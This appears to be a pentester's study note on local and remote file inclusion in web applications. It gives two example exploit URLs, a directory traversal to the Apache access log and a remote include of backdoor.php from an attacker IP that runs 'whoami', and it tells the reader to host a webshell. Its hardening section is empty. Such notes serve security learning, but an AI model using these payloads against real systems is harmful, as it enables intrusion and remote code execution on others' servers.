---
tags:
  - type/tech-specific 
  - tactic/execution/server-side 
  - tactic/credential-access 
  - tactic/exfiltration 
  - tactic/discovery 
---
# Fundamentals
allows to include the contents of a file in the webapp code --> possible code execution or file display, similar to [[2 Tech-Specifics/Web/WebApp Attacks/Directory Traversal|Directory Traversal]]
Two types exist:
- **Local FIle Inclusion (LFI):**
	- allows to execute a local file as part of the webapps source code
	- exploits the include function (used eg. used to include a separate script in an executable file)
- **Remote File Inclusion (RFI):**
	- fetch a remote fiele and execute execute it
	- less common than LFI
	- common scenario: a webserver fetches ressources from a remote server
## Entry Points:
- links that take a file as parameter
# Pentesting
- error messages help a lot to figure out how the webserver is accessing the files
- If exploitable: try to read or execute [[2 Tech-Specifics/OS/Sensitive Files|Sensitive Files]]
## Local File Inclusion (LFI)
- in php, instead of including a real file, we can use [[2 Tech-Specifics/Web/PHP#Wrappers|PHP Wrappers]]
- to achieve code execution, combine with
	- [[2 Tech-Specifics/Web/WebApp Attacks/Web Upload Vulnerabilities|Web Upload Vulnerabilities]]
	- [[2 Tech-Specifics/Web/WebApp Attacks/Injection Attacks/Logfile Poisoning|Logfile Poisoning]]
	- [[2 Tech-Specifics/Database/SQL Injection|SQL Injection]]
- example of an exploited url: `http://example.com/example/index.php?page=../../../../../var/log/apache2/access.log`
## Remote File Inclusion (RFI)
Precondition: non-default option `allow_url_fopen` on the webserver needs to be set
- typically, [[2 Tech-Specifics/Network/Protocols/TCP 445 SMB|TCP 445 SMB]] and [[2 Tech-Specifics/Network/Protocols/TCP 80, 443 HTTP(S)|TCP 80, 443 HTTP(S)]] can be used
- e.g. host a [[1 Methods/Security-Testing/3 Initial Access/Remote Shells|webshell]] on the attacker machine e.g. using the [[3 Tools/sharing files/simple python webserver|simple python webserver]] or [[3 Tools/sharing files/updog|updog]], and then include it on the victim webpage
- you can also include files from public sources
- example of an exploited url: `http://example.com/example/index.php?page=http://192.168.0.2/backdoor.php&cmd=whoami"
# Hardening
